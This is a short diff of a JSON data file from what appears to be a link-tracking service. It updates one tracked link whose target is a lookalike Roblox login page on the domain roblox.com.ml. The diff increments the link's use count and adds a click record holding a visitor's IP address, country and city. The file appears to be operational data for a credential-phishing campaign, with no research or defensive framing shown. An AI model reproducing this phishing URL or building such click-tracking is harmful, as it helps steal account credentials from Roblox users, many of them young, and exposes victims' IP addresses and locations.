@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 145,
+    "useCount": 146,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1272,6 +1272,14 @@
         "city": "Accra",
         "flag": "🇬🇭",
         "countryCode": "GH"
+      },
+      {
+        "timestamp": 1776952933366,
+        "ip": "103.57.207.60",
+        "country": "Myanmar",
+        "city": "Mandalay",
+        "flag": "🇲🇲",
+        "countryCode": "MM"
       }
     ]
   },
